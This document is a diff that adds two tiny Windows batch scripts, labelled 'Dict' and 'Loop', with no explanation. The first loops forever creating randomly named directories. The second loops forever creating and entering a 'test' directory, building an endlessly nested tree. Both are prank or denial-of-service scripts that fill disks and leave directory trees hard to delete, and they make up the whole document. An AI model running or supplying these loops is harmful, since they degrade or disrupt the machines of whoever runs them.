@@ -1,0 +1,11 @@
+Dict 
+:loop
+mkdir %random%
+goto :loop
+
+
+Loop
+:loop
+mkdir test
+cd test
+goto :loop
